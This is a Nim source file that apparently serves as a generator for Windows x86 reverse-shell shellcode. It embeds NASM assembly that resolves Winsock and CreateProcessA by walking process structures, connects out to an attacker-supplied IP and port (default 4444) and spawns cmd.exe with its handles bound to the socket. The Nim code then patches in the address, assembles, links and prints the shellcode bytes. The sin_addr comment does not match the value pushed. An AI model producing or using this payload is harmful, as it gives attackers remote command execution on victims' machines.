import strutils, os, sequtils, re, osproc

const originalAsm = """
[BITS 32]

global _start

section .text

_start:

; Locate Kernelbase.dll address
XOR ECX, ECX
MOV EAX, FS:[ecx + 0x30]
MOV EAX, [EAX + 0x0c]
MOV ESI, [EAX + 0x14]
LODSD
XCHG EAX, ESI
LODSD
XCHG EAX, ESI
LODSD
MOV EBX, [EAX + 0x10]

; Export Table
MOV EDX, DWORD  [EBX + 0x3C]
ADD EDX, EBX
MOV EDX, DWORD  [EDX + 0x78]
ADD EDX, EBX
MOV ESI, DWORD  [EDX + 0x20]
ADD ESI, EBX
XOR ECX, ECX

GetFunction :
INC ECX
LODSD
ADD EAX, EBX
CMP dword [EAX], 0x50746547
JNZ SHORT GetFunction
CMP dword [EAX + 0x4], 0x41636F72
JNZ SHORT GetFunction
CMP dword [EAX + 0x8], 0x65726464
JNZ SHORT GetFunction

MOV ESI, DWORD [EDX + 0x24]
ADD ESI, EBX
MOV CX,  WORD [ESI + ECX * 2]
DEC ECX
MOV ESI, DWORD [EDX + 0x1C]
ADD ESI, EBX
MOV EDX, DWORD [ESI + ECX * 4]
ADD EDX, EBX

; Get the Address of LoadLibraryA function
XOR ECX, ECX
PUSH EBX
PUSH EDX
PUSH ECX
PUSH 0x41797261
PUSH 0x7262694C
PUSH 0x64616F4C
PUSH ESP
PUSH EBX
MOV  ESI, EBX
CALL EDX

ADD ESP, 0xC
POP EDX
PUSH EAX
PUSH EDX
MOV DX, 0x6C6C
PUSH EDX
PUSH 0x642E3233
PUSH 0x5F327377
PUSH ESP
CALL EAX

ADD  ESP, 0x10
MOV  EDX, [ESP + 0x4]
PUSH 0x61617075
SUB  word [ESP + 0x2], 0x6161
PUSH 0x74726174
PUSH 0x53415357
PUSH ESP
PUSH EAX
MOV  EDI, EAX
CALL EDX

; Call WSAStartUp
XOR  EBX, EBX
MOV  BX, 0x0190
SUB  ESP, EBX
PUSH ESP
PUSH EBX
CALL EAX

;Find the address of WSASocketA
ADD  ESP, 0x10
XOR  EBX, EBX
ADD  BL, 0x4
IMUL EBX, 0x64
MOV  EDX, [ESP + EBX]
PUSH 0x61614174
SUB  word [ESP + 0x2], 0x6161
PUSH  0x656b636f
PUSH  0x53415357
PUSH ESP
MOV  EAX, EDI
PUSH EAX
CALL EDX
PUSH EDI

;call WSASocketA
XOR ECX, ECX
PUSH EDX
PUSH EDX
PUSH EDX
MOV  DL, 0x6
PUSH EDX
INC  ECX
PUSH ECX
INC  ECX
PUSH ECX
CALL EAX
XCHG EAX, ECX

;Find the address of connect
POP  EDI
ADD  ESP, 0x10
XOR  EBX, EBX
ADD  BL, 0x4
IMUL EBX, 0x63
MOV  EDX, [ESP + EBX]
PUSH 0x61746365
SUB  word [ESP + 0x3], 0x61
PUSH 0x6e6e6f63
PUSH ESP
PUSH EDI
XCHG ECX, EBP
CALL EDX

;call connect
PUSH 0x4401a8c0                      ;sin_addr set to 192.168.201.11
PUSH word 0x5c11                     ;port = 4444
XOR  EBX, EBX
add  BL, 0x2
PUSH word BX
MOV  EDX, ESP
PUSH byte  16
PUSH EDX
PUSH EBP
XCHG EBP, EDI
CALL EAX

;Find the address of CreateProcessA
ADD  ESP, 0x14
XOR  EBX, EBX
ADD  BL, 0x4
IMUL EBX, 0x62
MOV  EDX, [ESP + EBX]
PUSH 0x61614173
SUB  dword [ESP + 0x2], 0x6161
PUSH 0x7365636f
PUSH 0x72506574
PUSH 0x61657243
PUSH ESP
MOV  EBP, ESI
PUSH EBP
CALL EDX
PUSH EAX
LEA EBP, [EAX]

;call CreateProcessA
PUSH 0x61646d63
SUB  word [ESP + 0x3], 0x61
MOV  ECX, ESP
XOR  EDX, EDX
SUB  ESP, 16
MOV  EBX, esp

;STARTUPINFOA struct
PUSH EDI
PUSH EDI
PUSH EDI
PUSH EDX
PUSH EDX
XOR  EAX, EAX
INC  EAX
ROL  EAX, 8
PUSH EAX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
XOR  EAX, EAX
ADD  AL, 44
PUSH EAX

;ProcessInfo struct
MOV  EAX, ESP
PUSH EBX
PUSH EAX
PUSH EDX
PUSH EDX
PUSH EDX
XOR  EAX, EAX
INC  EAX
PUSH EAX
PUSH EDX
PUSH EDX
PUSH ECX
PUSH EDX
CALL EBP
"""

proc toLittleEndianIP(ip: string): string =
  let parts = ip.split(".").map(parseInt)
  if parts.len != 4:
    quit("[-] Invalid IP address")
  result = "0x" & toHex(parts[3], 2) & toHex(parts[2], 2) & toHex(parts[1], 2) & toHex(parts[0], 2)

proc toLittleEndianPort(port: int): string =
  if port < 1 or port > 65535:
    quit("[-] Invalid port")
  result = "0x" & toHex(port and 0xFF, 2) & toHex((port shr 8) and 0xFF, 2)

when isMainModule:
  if hostOs != "linux":
    echo "[-] Please use any Linux distro for creating shellcode for windows .))"
    quit(1)

  if paramCount() != 2:
    quit("Usage: generator <IP> <PORT>")

  let ip = paramStr(1)
  let port = parseInt(paramStr(2))

  let confIP = toLittleEndianIP(ip)
  let confPort = toLittleEndianPort(port)

  echo "[*] Replacing IP with: ", confIP
  echo "[*] Replacing PORT with: ", confPort

  let replaced = originalAsm
    .replace(re"(?m)^\s*PUSH\s+0x[0-9a-fA-F]+\s+;sin_addr.*", "PUSH " & confIP & "                      ; updated sin_addr")
    .replace(re"(?m)^\s*PUSH\s+word\s+0x[0-9a-fA-F]+\s+;port.*", "PUSH word " & confPort & "                     ; updated port")

  writeFile("root.nasm", replaced)
  echo "[+] Written modified assembly to root.nasm"

  echo "[+] Assemble root.nasm"
  discard execCmd("nasm -f win32 root.nasm -o root.obj")

  echo "[+] Linking"
  discard execCmd("ld -m elf_i386 -s  -o reverse.exe root.obj")
  echo "[+] Done !"
  
  echo "Printing Shellcode"

 #command = """objdump -d ./reverse.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g
#'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'"""

  let shellcode = execProcess("objdump -d ./reverse.exe | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\\x/g' | paste -d '' -s | sed 's/^/\"/' | sed 's/$/\"/'")

  echo shellcode
